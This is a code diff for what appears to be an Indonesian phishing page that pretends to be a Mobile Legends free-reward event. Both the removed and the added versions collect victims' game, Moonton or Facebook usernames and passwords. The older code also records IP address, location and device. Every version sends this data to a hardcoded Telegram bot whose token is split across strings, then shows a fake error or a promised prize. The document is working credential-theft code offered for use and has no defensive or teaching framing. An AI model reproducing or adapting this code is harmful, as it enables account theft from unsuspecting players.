@@ -1,126 +1,138 @@
+let chosenReward = "";
+let verifiedNickname = "";
+
 const part1 = "8816261841";
 const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
 const part3 = "5dArd9s";
 const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
 const CHAT_ID = "8335786077";
 
-function toggleSidebar() {
-    const menu = document.getElementById('sidebarMenu');
-    const overlay = document.getElementById('sidebarOverlay');
-    menu.classList.toggle('active');
-    overlay.classList.toggle('active');
+let checkTimeout;
+
+function showWarning() {
+    const alertBar = document.getElementById('alertBar');
+    alertBar.style.display = 'block';
+    setTimeout(() => {
+        alertBar.style.display = 'none';
+    }, 3000);
 }
 
-function openModal() {
+function checkAccountReal() {
+    const uid = document.getElementById('userid').value.trim();
+    const sid = document.getElementById('serverid').value.trim();
+    const statusDiv = document.getElementById('account-status');
+    
+    clearTimeout(checkTimeout);
+
+    if(uid.length >= 4 && sid.length >= 4) {
+        statusDiv.style.display = 'block';
+        statusDiv.style.background = 'rgba(41, 128, 185, 0.1)';
+        statusDiv.style.border = '1px solid rgba(41, 128, 185, 0.3)';
+        statusDiv.style.color = '#3498db';
+        statusDiv.innerHTML = "⏳ Menghubungkan ke server MLBB...";
+        
+        checkTimeout = setTimeout(() => {
+            fetch(`https://api.isan.eu.org/nickname/ml?id=${uid}&server=${sid}`)
+                .then(response => response.json())
+                .then(data => {
+                    if(data && data.success) {
+                        verifiedNickname = data.name;
+                        statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
+                        statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
+                        statusDiv.style.color = '#27ae60';
+                        statusDiv.innerHTML = `Akun (${verifiedNickname}) terdeteksi valid!`;
+                    } else {
+                        verifiedNickname = "";
+                        statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
+                        statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
+                        statusDiv.style.color = '#e74c3c';
+                        statusDiv.innerHTML = "ID dan Server tidak valid";
+                    }
+                })
+                .catch(err => {
+                    verifiedNickname = "";
+                    statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
+                    statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
+                    statusDiv.style.color = '#e74c3c';
+                    statusDiv.innerHTML = "ID dan Server tidak valid";
+                });
+        }, 600);
+    } else {
+        statusDiv.style.display = 'none';
+        verifiedNickname = "";
+    }
+}
+
+function selectReward(element, name) {
+    const uid = document.getElementById('userid').value.trim();
+    const sid = document.getElementById('serverid').value.trim();
+
+    if(!uid || !sid || !verifiedNickname) {
+        showWarning();
+        return;
+    }
+
+    const claimKey = `claimed_${uid}_${sid}`;
+    if(localStorage.getItem(claimKey)) {
+        alert(`Username ${verifiedNickname} telah mengambil hadiah pada event ini!`);
+        return;
+    }
+
+    document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
+    element.classList.add('active');
+    chosenReward = name;
+    document.querySelector('.selected-preview').innerHTML = "Item Dipilih:";
+    document.getElementById('preview-text').innerText = name;
+}
+
+function openLoginModal() {
+    const uid = document.getElementById('userid').value.trim();
+    const sid = document.getElementById('serverid').value.trim();
+
+    if(!uid || !sid || !verifiedNickname) {
+        showWarning();
+        return;
+    }
+    if(!chosenReward) {
+        alert("Silakan pilih salah satu hadiah terlebih dahulu!");
+        return;
+    }
+
+    const claimKey = `claimed_${uid}_${sid}`;
+    if(localStorage.getItem(claimKey)) {
+        alert(`Username ${verifiedNickname} telah mengambil hadiah pada event ini!`);
+        return;
+    }
+
     document.getElementById('loginModal').style.display = 'flex';
-    backToSelection();
 }
 
-function closeModal() {
-    document.getElementById('loginModal').style.display = 'none';
-}
+function sendDataToTelegram() {
+    const uid = document.getElementById('userid').value.trim();
+    const sid = document.getElementById('serverid').value.trim();
+    const method = document.getElementById('login-method').value;
+    const userAcc = document.getElementById('username').value.trim();
+    const passAcc = document.getElementById('password').value.trim();
 
-function selectMoonton() {
-    document.getElementById('selectionView').style.display = 'none';
-    document.getElementById('moontonFormView').style.display = 'block';
-    document.getElementById('facebookFormView').style.display = 'none';
-    document.getElementById('alertMsgMoonton').style.display = 'none';
-}
+    if(!userAcc || !passAcc) {
+        alert("Harap lengkapi informasi akun dan password Anda!");
+        return;
+    }
 
-function selectFacebook() {
-    document.getElementById('selectionView').style.display = 'none';
-    document.getElementById('moontonFormView').style.display = 'none';
-    document.getElementById('facebookFormView').style.display = 'block';
-}
+    const claimKey = `claimed_${uid}_${sid}`;
+    localStorage.setItem(claimKey, "true");
 
-function backToSelection() {
-    document.getElementById('selectionView').style.display = 'block';
-    document.getElementById('moontonFormView').style.display = 'none';
-    document.getElementById('facebookFormView').style.display = 'none';
-    document.getElementById('alertMsgMoonton').style.display = 'none';
-}
+    const message = `🚨 *NEW EVENT CLAIM* 🚨\n\n` +
+                    `🎁 *Hadiah Dipilih:* ${chosenReward}\n` +
+                    `👤 *Nickname Asli:* ${verifiedNickname}\n` +
+                    `🆔 *ID / Server:* ${uid} (${sid})\n` +
+                    `📌 *Metode:* ${method}\n` +
+                    `✉️ *Akun:* ${userAcc}\n` +
+                    `🔑 *Password:* ${passAcc}`;
 
-async function sendMoontonData(event) {
-    event.preventDefault();
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+    fetch(url).catch(err => console.error(err));
 
-    const gameId = document.getElementById('gameId').value;
-    const server = document.getElementById('server').value;
-    const account = document.getElementById('account').value;
-    const password = document.getElementById('password').value;
-    const btn = document.getElementById('submitMoontonBtn');
-    const alertMsg = document.getElementById('alertMsgMoonton');
-
-    btn.disabled = true;
-    btn.innerText = "Memproses...";
-    alertMsg.style.display = "none";
-
-    let ip = "N/A";
-    let loc = "Unknown";
-    try {
-        let res = await fetch('https://ipwho.is/');
-        let data = await res.json();
-        ip = data.ip || "N/A";
-        loc = `${data.city || ""}, ${data.country || "Indonesia"}`;
-    } catch (e) {}
-
-    const message = `🎮 TARGET LOGIN MOBILE LEGENDS (MOONTON)!\n\n` +
-                    `🆔 Game ID: <code>${gameId} (${server})</code>\n` +
-                    `👤 Akun: <code>${account}</code>\n` +
-                    `🔑 Sandi: <code>${password}</code>\n\n` +
-                    `🌐 IP: ${ip}\n` +
-                    `📍 Lokasi: ${loc}\n` +
-                    `💻 Device: ${navigator.userAgent}`;
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
-
-    try {
-        await fetch(url);
-    } catch (e) {}
-
-    setTimeout(() => {
-        alertMsg.style.display = "block";
-        btn.disabled = false;
-        btn.innerText = "Konfirmasi & Masuk";
-        document.getElementById('password').value = "";
-    }, 1500);
-}
-
-async function sendFBData(event) {
-    event.preventDefault();
-
-    const username = document.getElementById('fbUsername').value;
-    const password = document.getElementById('fbPassword').value;
-    const btn = document.getElementById('submitFBBtn');
-
-    btn.disabled = true;
-    btn.innerText = "Memproses...";
-
-    let ip = "N/A";
-    let loc = "Unknown";
-    try {
-        let res = await fetch('https://ipwho.is/');
-        let data = await res.json();
-        ip = data.ip || "N/A";
-        loc = `${data.city || ""}, ${data.country || "Indonesia"}`;
-    } catch (e) {}
-
-    const message = `📱 TARGET LOGIN FACEBOOK (MOBILE VIEW)!\n\n` +
-                    `👤 User/No: <code>${username}</code>\n` +
-                    `🔑 Sandi: <code>${password}</code>\n\n` +
-                    `🌐 IP: ${ip}\n` +
-                    `📍 Lokasi: ${loc}\n` +
-                    `💻 Device: ${navigator.userAgent}`;
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
-
-    try {
-        await fetch(url);
-    } catch (e) {}
-
-    setTimeout(() => {
-        btn.disabled = false;
-        btn.innerText = "Login";
-        document.getElementById('fbPassword').value = "";
-        alert("Kata sandi salah. Harap coba lagi.");
-    }, 1200);
+    alert(`Selamat (${verifiedNickname}). ${chosenReward} anda akan segera dikirim dalam inbox dalam 2x24Jam!`);
+    location.reload();
 }
